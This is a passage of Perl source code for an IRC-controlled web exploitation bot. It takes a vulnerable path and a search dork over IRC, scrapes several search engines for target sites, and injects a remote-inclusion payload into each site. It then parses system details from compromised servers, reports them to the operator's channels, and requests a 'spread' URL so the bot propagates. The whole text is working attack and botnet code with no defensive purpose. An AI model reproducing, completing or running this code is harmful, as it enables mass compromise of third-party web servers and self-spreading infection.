"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                            }
                        }
                    }
                }
            }
            exit;
        }
    }

    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) {
        if ( my $pid = fork ) {
            waitpid( $pid, 0 );
        }
        else {
            if (fork) {
                exit;
            }
            else {
                my $bug       = $1;
                my $dork      = $2;
                my $contatore = 0;
                my %hosts;
                my @mlist = &msn($dork);
                push( my @tot, @mlist );
                my @puliti = &unici(@tot);
                display( $dsp,
                        "PRIVMSG $channel :9,1MSN  "
                      . scalar(@tot)
                      . " 9,1/9,1 "
                      . scalar(@puliti)
                      . "   9,1pentru4,1 $dork" );
                my $uni = scalar(@puliti);

                foreach my $site (@puliti) {
                    $contatore++;
                    if ( $contatore % 100 == 0 ) {
                    }
                    if ( $contatore == $uni - 1 ) {
                        display( $dsp,
"PRIVMSG $channel :12MSN a terminat pentru4,1 $dork"
                        );
                    }
                    my $test  = "http://" . $site . $bug . $id . "?";
                    my $print = "http://" . $site . $bug . $printcmd . "?";
                    my $req   = HTTP::Request->new( GET => $test );
                    my $ua    = LWP::UserAgent->new();
                    $ua->timeout(5);
                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        my $re = $response->content;
                        if ( $re =~ /kangkung/ && $re =~ /uid=/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1ID: $id1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                my $test2 =
                                  "http://" . $site . $bug . $spread . "?";
                                my $reqz = HTTP::Request->new( GET => $test2 );
                                my $ua = LWP::UserAgent->new();
                                my $response = $ua->request($reqz);
                            }
                        }
                        elsif ( $re =~ /kangkung/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                            }
                        }
                    }
                }
            }
            exit;
        }
    }

    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) {
        if ( my $pid = fork ) {
            waitpid( $pid, 0 );
        }
        else {
            if (fork) {
                exit;
            }
            else {
                my $bug       = $1;
                my $dork      = $2;
                my $contatore = 0;
                my %hosts;
                my @asklist = &ask($dork);
                push( my @tot, @asklist );
                my @puliti = &unici(@tot);
                display( $dsp,
                        "PRIVMSG $channel :9,1ASK "
                      . scalar(@tot)
                      . " 9,1/9,1 "
                      . scalar(@puliti)
                      . " 9,1 pentru4,1 $dork" );
                my $uni = scalar(@puliti);

                foreach my $site (@puliti) {
                    $contatore++;
                    if ( $contatore % 100 == 0 ) {
                    }
                    if ( $contatore == $uni - 1 ) {
                        display( $dsp,
"PRIVMSG $channel :9,1ASK a terminat pentru4,1 $dork"
                        );
                    }
                    my $test  = "http://" . $site . $bug . $id . "?";
                    my $print = "http://" . $site . $bug . $printcmd . "?";
                    my $req   = HTTP::Request->new( GET => $test );
                    my $ua    = LWP::UserAgent->new();
                    $ua->timeout(5);
                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        my $re = $response->content;
                        if ( $re =~ /kangkung/ && $re =~ /uid=/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1ID: $id1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                my $test2 =
                                  "http://" . $site . $bug . $spread . "?";
                                my $reqz = HTTP::Request->new( GET => $test2 );
                                my $ua = LWP::UserAgent->new();
                                my $response = $ua->request($reqz);
                            }
                        }
                        elsif ( $re =~ /kangkung/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                            }
                        }
                    }
                }
            }
            exit;
        }
    }

    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) {
        if ( my $pid = fork ) {
            waitpid( $pid, 0 );
        }
        else {
            if (fork) {
                exit;
            }
            else {
                my $bug       = $1;
                my $dork      = $2;
                my $contatore = 0;
                my %hosts;
                my @fireball = fireball($dork);
                push( my @tot, @fireball );
                my @puliti = &unici(@tot);
                display( $dsp,
                        "PRIVMSG $channel :9,1FIREBALL  "
                      . scalar(@tot)
                      . " 9,1/9,1 "
                      . scalar(@puliti)
                      . "   19,1 pentru4,1 $dork" );
                my $uni = scalar(@puliti);

                foreach my $site (@puliti) {
                    $contatore++;
                    if ( $contatore % 100 == 0 ) {
                    }
                    if ( $contatore == $uni - 1 ) {
                        display( $dsp,
"PRIVMSG $channel :9,1FIREBALL a terminat pentru4,1 $dork"
                        );
                    }
                    my $test  = "http://" . $site . $bug . $id . "?";
                    my $print = "http://" . $site . $bug . $printcmd . "?";
                    my $req   = HTTP::Request->new( GET => $test );
                    my $ua    = LWP::UserAgent->new();
                    $ua->timeout(5);
                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        my $re = $response->content;
                        if ( $re =~ /kangkung/ && $re =~ /uid=/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1ID: $id1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                my $test2 =
                                  "http://" . $site . $bug . $spread . "?";
                                my $reqz = HTTP::Request->new( GET => $test2 );
                                my $ua = LWP::UserAgent->new();
                                my $response = $ua->request($reqz);
                            }
                        }
                        elsif ( $re =~ /kangkung/ ) {
                            my $hs = geths($print);
                            $hosts{$hs}++;
                            if ( $hosts{$hs} == "1" ) {
                                $x = os($test);
                                 ( $type, $space ) = split( /\,/, $x );
                                sleep(4);
                                display( $dsp,
"PRIVMSG $channel :9,1Exploiting .."
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Safemode: 8,1Off 9,1Os: $os Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uname -a: 8,1$un"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1HDD: 8,1Free: ($free) Used: ($used) Total: ($all)"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Uptime: 8,1 $up"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PWD: 8,1$pwd1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1PHP Vers: 8,1 $php1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Software: 8,1 $sof1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1IP Addr: 8,1 $ip1"
                                );
                                display( $dsp,
"PRIVMSG $channel :9,1Hostname: 8,1 $name1"
                                );
                                display( $dsp,
"PRIVMSG $admin :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                                display( $dsp,
"PRIVMSG $chanres :9,1Safemode:8,1 On 9,1Os: $os 8,1Link: $print"
                                );
                            }
                        }
                    }
                }
            }
            exit;
        }
    }
}

sub display() {
    if ( $#_ == '1' ) {
        my $dsp = $_[0];
        print $dsp "$_[1]\n";
    }
    else {
        print $dsp "$_[0]\n";
    }
}

sub os() {
    my $site = $_[0];
    my $Res  = query($site);

    while ( $Res =~ m/<br>uname -a:(.+?)\<br>/g ) {
        $un = $1;
    }
    while ( $Res =~ m/<br>uptime:(.+?)\<br>/g ) {
        $up = $1;
    }
    while ( $Res =~ m/<br>id:(.+?)\<br>/g ) {
        $id1 = $1;
    }
    while ( $Res =~ m/<br>pwd:(.+?)\<br>/g ) {
        $pwd1 = $1;
    }
    while ( $Res =~ m/<br>php:(.+?)\<br>/g ) {
        $php1 = $1;
    }
    while ( $Res =~ m/<br>software:(.+?)\<br>/g ) {
        $sof1 = $1;
    }
    while ( $Res =~ m/<br>server-ip:(.+?)\<br>/g ) {
        $ip1 = $1;
    }
    while ( $Res =~ m/<br>server-name:(.+?)\<br>/g ) {
        $name1 = $1;
    }
    while ( $Res =~ m/<br>os:(.+?)\<br>/g ) {
        $os = $1;
    }
    while ( $Res =~ m/<br>free:(.+?)\<br>/g ) {
        $free = $1;
    }
    while ( $Res =~ m/<br>used:(.+?)\<br>/g ) {
        $used = $1;
    }
    while ( $Res =~ m/<br>total:(.+?)\<br>/g ) {
        $all = $1;
    }
}

sub googlet {
    my @dominios = (
        "ae", "com.ar", "at", "com.au", "be", "com.br",
        "ca", "ch", "cl", "de", "dk", "eu", "sa", "id", "tr", "pl", "uk", "gov", "my", "mx"
    );
    my @country =
      ( "AE", "AR", "AT", "AU", "BE", "BR", "CA", "CH", "CL", "DE", "DK" );
    my @lst;
    my $key = key( $_[0] );
    my $c   = 0;
    foreach my $i (@dominios) {
        my @lista = google( $i, $key, $country[$c] );
        push( @lst, @lista );
        $c++;
    }
    return @lst;
}

sub google() {
    my @lst;
    my $i       = $_[0];
    my $key     = $_[1];
    my $country = $_[2];
    for ( $b = 0 ; $b <= 100 ; $b += 100 ) {
        my $Go =
          (     "www.google." . $i
              . "/search?hl=en&q="
              . key($key)
              . "&num=100&start="
              . $b
              . "&meta=cr%3Dcountry"
              . $country );
        my $Res = query($Go);
        while ( $Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /google/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}


sub alltheweb() {
    my @lst;
    my $key = $_[0];
    my $i   = 0;
    my $pg  = 0;
    for ( $i = 0 ; $i <= 1000 ; $i += 100 ) {
        my $all =
          ( "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q="
              . key($key) . "&o="
              . $i );
        my $Res = query($all);
        while ( $Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub altavista() {
    my @lst;
    my $key = $_[0];
    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
        my $AlT =
("http://www.altavista.com/web/results?itag=ody&q=".key($key)."&kgs=".$b);
        my $Res = query($AlT);
        while ( $Res =~ m/<span class=ngrn>(.+?)\//g ) {
            if ( $1 !~ /altavista/ ) {
                my $k = $1;
                $k =~ s/<//g;
                $k =~ s/ //g;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
        if   ( $Res =~ /target=\"_self\">Succ/ ) { }
        else                                     { return @lst; }
    }
    return @lst;
}


sub uolsub() {
    my @lst;
    my $key = $_[0];
    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
        my $UoL =
          (     "http://busca.uol.com.br/www/index.html?q="
              . key($key)
              . "&start="
              . $i );
        my $Res = query($UoL);
        while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g ) {
            my $k = $1;
            if ( $k !~ /busca|uol|yahoo/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub search() {
    my $key = $_[0];
    my $i   = 1;
    my $pg  = 80;
    my @lst;
    my $av = 1;
    while ( $i <= $pg ) {
        my $search = "http://www.search.com/search?q=$key";
        my $req    = HTTP::Request->new( GET => $search );
        my $ua     = LWP::UserAgent->new();
        $ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
        my $response = $ua->request($req);
        my $resp     = $response->content;
        while ( $resp =~ m/<a href=\"?http:\/\/(.+?)\//g ) {
            if ( $1 !~ /msn|live|google|yahoo/ ) {
                my $ok = "$1/";
                push( @lst, $ok );
            }
        }
        $av = $av + 10;
        $i++;
    }
    return @lst;
}

sub searchs() {
    my @lst;
    my $key = $_[0];
    for ( $b = 1 ; $b <= 100 ; $b++ ) {
        my $sc =
          ( "http://www.search.com/search?q=" . key($key) . "&nav=" . $b );
        my $Res = query($sc);
        while ( $Res =~ m/<a href=\"?http:\/\/(.+?)/g ) {
            my $k    = $1;
            my @grep = links($k);
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub msn() {
    my @lst;
    my $key = $_[0];
    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
        my $MsN =
          (     "http://search.live.com/results.aspx?q="
              . key($key)
              . "&first="
              . $b
              . "&FORM=PERE" );
        my $Res = query($MsN);
        while ( $Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub ask() {
    my @lst;
    my $key = $_[0];
    my $i   = 0;
    my $pg  = 0;
    for ( $i = 0 ; $i <= 1000 ; $i += 10 ) {
        my $Ask =
          (     "http://it.ask.com/web?q="
              . key($key)
              . "&o=312&l=dir&qsrc=0&page="
              . $i
              . "&dm=all" );
        my $Res = query($Ask);
        while ( $Res =~
            m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g )
        {
            my $k = $3;
            $k =~ s/[\"\ ]//g;
            my @grep = links($k);
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub fireball() {
    my $key    = $_[0];
    my $inizio = 1;
    my $pagine = 200;
    my @lst;
    my $av = 0;
    while ( $inizio <= $pagine ) {
        my $fireball =
            "http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query="
          . key($key)
          . "&cat=fb_loc&idx=all&enc=utf-8";
        my $Res = query($fireball);
        while ( $Res =~ m/<a href=\"?http:\/\/(.+?)\//g ) {
            if ( $1 !~ /msn|live|google|yahoo/ ) {
                my $k    = "$1/";
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
        $av = $av + 10;
        $inizio++;
    }
    return @lst;
}

sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}

sub geths() {
    my $host = $_[0];
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    return $host;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}

sub end() {
    $string = $_[0];
    $string .= "/";
    $string =~ s/\/\//\//;
    while ( $string =~ /\/\// ) {
        $string =~ s/\/\//\//;
    }
    return ($string);
}

sub query($) {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host  = $url;
    my $query = $url;
    my $page  = "";
    $host  =~ s/href=\"?http:\/\///;
    $host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    if ( $query eq "" ) { $query = "/"; }
    eval {
        my $sock = IO::Socket::INET->new(
            PeerAddr => "$host",
            PeerPort => "80",
            Proto    => "tcp"
        ) or return;
        print $sock
"GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
        my @r = <$sock>;
        $page = "@r";
        close($sock);
    };
    return $page;
}

sub get_link() {
    my $file_print = $_[1];
    my $link       = $_[0];
    my $host       = $_[0];
    my $host_dir   = $_[0];
    my @links;
    $host_dir =~ s/(.*)\/[^\/]*$/\1/;
    $host     =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host_dir = &end($host_dir);
    $host     = &end($host);
    $link     = &end($host);
    push( @links, $link, $host, $host_dir );
    open( $file, '>>', $file_print );
    print $file "$link\n$host_dir\n$host\n";
    close($file);
    return @links;
}

sub unici {
    my @unici = ();
    my %visti = ();
    foreach my $elemento (@_) {
        $elemento =~ s/\/+/\//g;
        next if $visti{$elemento}++;
        push @unici, $elemento;
    }
    return @unici;
}





